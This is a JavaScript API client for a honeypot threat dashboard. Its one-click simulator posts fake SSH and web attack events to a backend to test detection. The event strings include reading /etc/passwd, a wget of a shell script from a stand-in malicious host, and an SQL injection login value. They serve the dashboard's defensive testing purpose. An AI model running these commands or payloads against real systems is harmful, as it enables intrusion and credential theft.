// Connects to live Render backend by default on Vercel and remote hosts
export function getBaseUrl() {
  if (typeof window !== 'undefined') {
    const host = window.location.hostname;
    // On Vercel or any remote production domain, ALWAYS use live Render backend
    if (host.includes('vercel.app') || (host !== 'localhost' && host !== '127.0.0.1' && !host.startsWith('192.168.'))) {
      return 'https://kurukshetra-backend.onrender.com';
    }
  }
  if (import.meta.env.VITE_API_URL && !import.meta.env.VITE_API_URL.includes('127.0.0.1') && !import.meta.env.VITE_API_URL.includes('localhost')) {
    return import.meta.env.VITE_API_URL.replace(/\/$/, '');
  }
  return 'https://kurukshetra-backend.onrender.com';
}

const BASE_URL = getBaseUrl();

async function apiFetch(path, options = {}) {
  const url = `${BASE_URL}${path}`;
  const res = await fetch(url, {
    headers: { 'Content-Type': 'application/json', ...options.headers },
    ...options,
  });
  if (!res.ok) {
    const text = await res.text().catch(() => '');
    throw new Error(`[${res.status}] ${path}: ${text}`);
  }
  // Some endpoints return empty body on success
  const ct = res.headers.get('content-type') || '';
  if (ct.includes('application/json')) return res.json();
  return null;
}

// ─── Health ──────────────────────────────────────────────────────────────────
export const checkHealth = () => apiFetch('/health');

// ─── Dashboard ───────────────────────────────────────────────────────────────
export const fetchDashboardSummary = () => apiFetch('/api/dashboard/summary');

// ─── Attacks / Sessions ──────────────────────────────────────────────────────
export const fetchAttacks = () => apiFetch('/api/attacks');
export const fetchSessionDetails = (id) => apiFetch(`/api/sessions/${id}`);
export const containSession = (id) =>
  apiFetch(`/api/sessions/${id}/contain`, { method: 'POST' });

// ─── IOCs ────────────────────────────────────────────────────────────────────
export const fetchIOCs = () => apiFetch('/api/iocs');

// ─── Attacker DNA ────────────────────────────────────────────────────────────
export const fetchAttackers = () => apiFetch('/api/attackers');

// ─── MITRE ATT&CK ────────────────────────────────────────────────────────────
export const fetchMitre = (sessionId) =>
  apiFetch(sessionId ? `/api/mitre/${sessionId}` : '/api/mitre');

// ─── Reports ─────────────────────────────────────────────────────────────────
export const fetchReport = (sessionId) => apiFetch(`/api/reports/${sessionId}`);

// ─── AI Threat Landscape (live analysis for AI Advisory tab) ────────────────
export const fetchAIThreatAnalysis = (limit = 40) =>
  apiFetch(`/api/ai/threat-analysis?limit=${limit}`);

// ─── One-Click Simulator ─────────────────────────────────────────────────────
// Sends a full multi-stage attack campaign to the live backend (schema-compliant).
const SIM_IPS = [
  '185.220.101.45', '23.129.64.101', '45.142.212.100',
  '194.165.16.77', '62.102.148.69', '109.70.100.23',
];
const TARGET_IP = '10.0.0.100';

const SSH_CAMPAIGN = [
  { event_type: 'auth_attempt', event: 'Failed password for root', metadata: { username: 'root', success: false } },
  { event_type: 'auth_attempt', event: 'Failed password for admin', metadata: { username: 'admin', success: false } },
  { event_type: 'auth_attempt', event: 'Accepted password for root', metadata: { username: 'root', success: true } },
  { event_type: 'command', event: 'whoami', metadata: { cwd: '/root' } },
  { event_type: 'command', event: 'uname -a', metadata: {} },
  { event_type: 'command', event: 'cat /etc/passwd', metadata: {} },
  { event_type: 'decoy_access', event: 'cat /root/fake-credentials.txt', metadata: { resource: 'fake-credentials', is_decoy: true } },
  { event_type: 'command', event: 'wget http://malware.xyz/shell.sh -O /tmp/x.sh', metadata: {} },
  { event_type: 'command', event: 'sudo -l', metadata: {} },
];

const WEB_CAMPAIGN = [
  { event_type: 'http_request', event: 'GET /robots.txt', metadata: { method: 'GET', path: '/robots.txt', user_agent: 'Nikto/2.1.6' } },
  { event_type: 'http_request', event: 'GET /admin', metadata: { method: 'GET', path: '/admin', user_agent: 'curl/7.68.0' } },
  { event_type: 'decoy_access', event: 'GET /fake-config', metadata: { resource: 'fake-config', is_decoy: true } },
  { event_type: 'auth_attempt', event: "POST /login admin' OR '1'='1", metadata: { username: 'admin', injection: true } },
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function evtId(sessionId, n) { return `EVT-SIM-${sessionId.slice(-8)}-${String(n).padStart(3, '0')}`; }

async function postEvent(payload) {
  return apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });
}

export async function runAttackSimulation() {
  const service = Math.random() > 0.5 ? 'ssh' : 'web';
  const ip = pick(SIM_IPS);
  const sessionId = `ATK-SIM-${Date.now().toString(36).toUpperCase()}`;
  const events = service === 'ssh' ? SSH_CAMPAIGN : WEB_CAMPAIGN;
  const ts = () => new Date().toISOString();

  let last = null;
  for (let i = 0; i < events.length; i++) {
    const e = events[i];
    last = await postEvent({
      event_id: evtId(sessionId, i + 1),
      session_id: sessionId,
      source_ip: ip,
      target_ip: TARGET_IP,
      service,
      timestamp: ts(),
      event_type: e.event_type,
      event: e.event,
      metadata: { ...e.metadata, simulation: true, campaign: 'dashboard_one_click' },
    });
    await new Promise(r => setTimeout(r, 350));
  }
  return last;
}
